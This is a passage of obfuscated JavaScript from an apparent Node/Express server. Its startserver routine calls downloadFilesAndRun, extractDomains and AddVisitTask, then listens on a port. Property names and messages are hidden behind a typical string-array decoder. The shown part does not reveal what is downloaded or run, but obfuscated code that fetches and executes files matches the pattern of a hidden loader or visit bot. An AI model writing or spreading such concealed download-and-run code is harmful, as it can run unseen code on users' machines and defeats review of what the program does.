downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x142615){console[_0x2a7837(0x15c)]('Error\x20in\x20startserver:',_0x142615);}}function _0x97c1(_0x9fe44d,_0x5e3b48){const _0xf002dd=_0xf002();return _0x97c1=function(_0x97c107,_0x517ef3){_0x97c107=_0x97c107-0xe0;let _0x528904=_0xf002dd[_0x97c107];return _0x528904;},_0x97c1(_0x9fe44d,_0x5e3b48);}startserver()[_0x2fc93c(0xe1)](_0x4bae38=>{const _0x21c3b4=_0x2fc93c;console[_0x21c3b4(0x15c)](_0x21c3b4(0x163),_0x4bae38);}),app[_0x2fc93c(0x13c)](PORT,()=>console[_0x2fc93c(0x172)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
